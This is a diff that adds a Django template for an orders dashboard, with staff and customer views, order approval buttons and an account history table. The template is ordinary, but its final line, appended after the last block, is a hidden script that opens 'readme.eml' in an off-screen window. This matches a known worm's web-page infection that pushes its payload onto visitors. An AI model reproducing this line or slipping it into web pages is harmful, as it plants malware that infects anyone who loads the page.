@@ -1,0 +1,377 @@
+{% extends 'Home/base.html' %}
+
+{% load static %}
+
+
+<link rel="icon" type="image/x-icon" href="{% static 'img/logo.png' %}">
+
+
+{% block title %}
+	<title>Orders</title>
+{% endblock %}
+
+
+{% block main_content %}
+  {% if user.is_staff %}
+    <div class="row">
+      <div class="col-lg-3 col-6">
+        <!-- small box -->
+        <div class="small-box bg-info">
+            <div class="inner">
+                <h3>{{all_codes_count}}</h3>
+                <p>Codes</p>
+            </div>
+          <div class="icon">
+            <i class="ion fas fa-gifts"></i>
+          </div>
+          <a href="{% url 'Home:account_code' %}" class="small-box-footer">More info<i class="fas fa-arrow-circle-right"></i></a>
+        </div>
+      </div>
+      <!-- ./col -->
+      <div class="col-lg-3 col-6">
+        <!-- small box -->
+        <div class="small-box bg-success">
+          <div class="inner">
+            <h3>&#8358; {{total_amount}}</h3>
+            <p>Total Balance</p>
+          </div>
+          <div class="icon">
+            <i class="ion fas fa-wallet"></i>
+          </div>
+          <a href="#" class="small-box-footer">More info <i class="fas fa-arrow-circle-right"></i></a>
+        </div>
+      </div>
+      <!-- ./col -->
+      <div class="col-lg-3 col-6">
+        <!-- small box -->
+        <div class="small-box bg-warning">
+          <div class="inner">
+            <h3>{{all_customers}}</h3>
+            <p>Customers</p>
+          </div>
+          <div class="icon">
+            <i class="ion fas fa-user"></i>
+          </div>
+          <a href="{% url 'Home:account_users_list' 'customers' %}" class="small-box-footer">More info <i class="fas fa-arrow-circle-right"></i></a>
+        </div>
+      </div>
+      <!-- ./col -->
+      <div class="col-lg-3 col-6">
+        <!-- small box -->
+        <div class="small-box bg-danger">
+          <div class="inner">
+            <h3>{{all_agents}}</h3>
+            <p>Agents</p>
+          </div>
+          <div class="icon">
+            <i class="ion fas fa-user-tie"></i>
+          </div>
+          <a href="{% url 'Home:account_users_list' 'agents' %}" class="small-box-footer">More info <i class="fas fa-arrow-circle-right"></i></a>
+        </div>
+      </div>
+      <!-- ./col -->
+    </div>
+  {% else %}
+    <div class="row">
+          <div class="col-lg-3 col-6">
+            <!-- small box -->
+            <div class="small-box bg-info">
+                <div class="inner">
+                    <h3>0</h3>
+                    <p>My Codes</p>
+                </div>
+              <div class="icon">
+                <i class="ion fas fa-gifts"></i>
+              </div>
+              <a href="{% url 'Home:account_code' %}" class="small-box-footer">More info<i class="fas fa-arrow-circle-right"></i></a>
+            </div>
+          </div>
+          <!-- ./col -->
+          <div class="col-lg-3 col-6">
+            <!-- small box -->
+            <div class="small-box bg-success">
+              <div class="inner">
+                <h3>&#8358; {{user_wallet.wallet_balance}}</h3>
+                <p>Wallet Balance</p>
+              </div>
+              <div class="icon">
+                <i class="ion fas fa-wallet"></i>
+              </div>
+              <a href="{% url 'Home:account_users_wallet' %}" class="small-box-footer">More info <i class="fas fa-arrow-circle-right"></i></a>
+            </div>
+          </div>
+      <!-- ./col -->
+      <div class="col-lg-6 col-12">
+        <div class="card callout callout-info">
+            <!-- /.card-header -->
+            <div class="card-header">
+              <small class="card-title">Notice</small>
+            </div>
+          <div class="card-body">
+              <p class="card-text">
+              {{notice_notes}}
+              </p>
+            </div>
+        </div>
+        <!-- /.card -->
+      </div>
+    </div>
+  {% endif %}
+{% endblock %}
+
+
+{% block page_header %}
+  <div class="content-wrapper">
+  <div class="content-header">
+    <div class="container-fluid">
+      <div class="row mb-2">
+        <div class="col-sm-6">
+          <h1 class="m-0 text-dark">Orders</h1>
+        </div>
+        <div class="col-sm-6">
+          <ol class="breadcrumb float-sm-right">
+            <li class="breadcrumb-item"><a href="{% url 'Home:show_all_orders' %}">Orders</a></li>
+            <li class="breadcrumb-item active">Orders</li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </div>
+{% endblock %}
+
+
+{% block content %}
+  {% if user.is_staff %}
+    <section class="content">
+        <div class="container-fluid">
+            <div class="row">
+              <div class="col-md connectedSortable">
+                <div class="row">
+                  <div class="col connectedSortable">
+                    <div class="card">
+                      <div class="card-header border-transparent">
+                            <h3 class="card-title">Orders</h3>
+
+                            <div class="card-tools">
+                          <button type="button" class="btn btn-tool" data-card-widget="collapse">
+                                  <i class="fas fa-minus"></i>
+                                </button>
+                                <button type="button" class="btn btn-tool" data-card-widget="remove">
+                                  <i class="fas fa-times"></i>
+                              </button>
+                            </div>
+                        </div>
+
+                        <div class="card-body p-0">
+                          <div class="table-responsive" style="height: 18rem;">
+                            <table class="table m-0">
+                                <thead>
+                                    <tr>
+                                      <th>ID</th>
+                                      <th>Transaction</th>
+                                      <th>Amount</th>
+                                      <th>Recipient</th>
+                                      <th>Description</th>
+                                      <th>Status</th>
+                                      <th>Toggle</th>
+                                      <th>Date</th>
+                                    </tr>
+                                  </thead>
+                                  <tbody>
+                                    {% if admin_orders_truncate %}
+                                      {% for order in admin_orders_truncate %}
+                                        <div class="modal fade" id="confirmSave">
+                                          <div class="modal-dialog modal-sm">
+                                            <div class="modal-content">
+                                                <div class="modal-header">
+                                                    <h4 class="modal-title">Confirm Request</h4>
+                                                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                                    <span aria-hidden="true">&times;</span>
+                                                  </button>
+                                                </div>
+                                                <div class="modal-body">
+                                                  {% if order.status == 'Pending' %}
+                                                    <p>Are you sure you want to Accept this order?</p>
+                                                  {% endif %}
+                                                </div>
+                                                <div class="modal-footer justify-content-between">
+                                                  <a href="{% url 'Home:toggle_order' order.id %}"><button type="button" class="btn btn-primary btn-success">Yes</button></a>
+                                                  <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
+                                                </div>
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <tr id="{{order.id}}">
+                                          <td>{{forloop.counter}}</td>
+                                          <td>{{order.transaction}}</td>
+                                          <td>{{order.amount}}</td>
+                                          <td>{{order.recipient}}</td>
+                                          <td>{{order.description}}</td>
+                                          <td>
+                                            <span class="badge badge-info">
+                                              {{order.status}}
+                                            </span>
+                                          </td>
+                                          <td>
+                                            {% if order.status == 'Pending' %}
+                                                <a href="{% url 'Home:toggle_order' order.id %}"><button type="button" class="btn btn-sm btn-success">Approve</button></a>
+                                            {% else %}
+                                                <button class="btn btn-primary btn-sm disabled">{{order.status}}</button>
+                                            {% endif %}
+                                          </td>
+                                          <td>{{order.date}}</td>
+                                        </tr>
+                                      {% endfor %}
+                                    {% endif %}
+                                  </tbody>
+                              </table>
+                          </div>
+                        </div>
+
+                          </div>
+                      </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+        </div>
+
+    </section>
+  {% else %}
+    <section class="content">
+        <div class="container-fluid">
+            <div class="row">
+              <div class="col-md connectedSortable">
+                <div class="row">
+                  <div class="col connectedSortable">
+                    <div class="card">
+                      <div class="card-header border-transparent">
+                            <h3 class="card-title">Orders</h3>
+
+                            <div class="card-tools">
+                          <button type="button" class="btn btn-tool" data-card-widget="collapse">
+                                  <i class="fas fa-minus"></i>
+                                </button>
+                                <button type="button" class="btn btn-tool" data-card-widget="remove">
+                                  <i class="fas fa-times"></i>
+                              </button>
+                            </div>
+                        </div>
+
+                        <div class="card-body p-0">
+                          <div class="table-responsive" style="height: 18rem;">
+                            <table class="table m-0">
+                                <thead>
+                                    <tr>
+                                      <th>ID</th>
+                                      <th>Transaction</th>
+                                      <th>Amount</th>
+                                      <th>Recipient</th>
+                                      <th>Description</th>
+                                      <th>Status</th>
+                                      <th>Date</th>
+                                    </tr>
+                                  </thead>
+                                  <tbody>
+                                    {% if orders %}
+                                      {% for order in orders %}
+                                        <tr>
+                                          <td>{{forloop.counter}}</td>
+                                          <td>{{order.transaction}}</td>
+                                          <td>{{order.amount}}</td>
+                                          <td>{{order.recipient}}</td>
+                                          <td>{{order.description}}</td>
+                                          <td>
+                                            <span class="badge badge-info">
+                                                    {{order.status}}
+                                                  </span>
+                                                </td>
+                                          <td>{{order.date}}</td>
+                                        </tr>
+                                {% endfor %}
+                              {% endif %}
+                                  </tbody>
+                              </table>
+                          </div>
+                        </div>
+
+                          </div>
+                      </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+        </div>
+
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md connectedSortable">
+                  <div class="row">
+              <div class="col connectedSortable">
+                <div class="card">
+                  <div class="card-header border-transparent">
+                        <h3 class="card-title">Account History</h3>
+
+                        <div class="card-tools">
+                      <button type="button" class="btn btn-tool" data-card-widget="collapse">
+                              <i class="fas fa-minus"></i>
+                            </button>
+                            <button type="button" class="btn btn-tool" data-card-widget="remove">
+                              <i class="fas fa-times"></i>
+                          </button>
+                        </div>
+                    </div>
+
+                    <div class="card-body p-0">
+                      <div class="table-responsive">
+                        <table class="table m-0">
+                            <thead>
+                                <tr>
+                                  <th>ID</th>
+                                  <th>Description</th>
+                                  <th>Amount</th>
+                                  <th>Charges</th>
+                                  <th>Status</th>
+                                  <th>Date</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                {% if user_history %}
+                                  {% for history in user_history %}
+                              <tr>
+                                <td>{{forloop.counter}}</td>
+                                <td>{{history.description}}</td>
+                                <td>{{history.amount}}</td>
+                                <td>{{history.charges}}</td>
+                                {% if history.status %}
+                                  <td>
+                                    <span class="badge badge-success">
+                                            Approved
+                                          </span>
+                                        </td>
+                                {% else %}
+                                  <td>
+                                    <span class="badge badge-danger">
+                                            Declined
+                                          </span>
+                                        </td>
+                                {% endif %}
+                                <td>{{history.date}}</td>
+                              </tr>
+                                  {% endfor %}
+                                {% endif %}
+                              </tbody>
+                          </table>
+                      </div>
+                    </div>
+                      </div>
+                  </div>
+              </div>
+            </div>
+        </div>
+        </div>
+    </section>
+  {% endif %}
+{% endblock %}
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
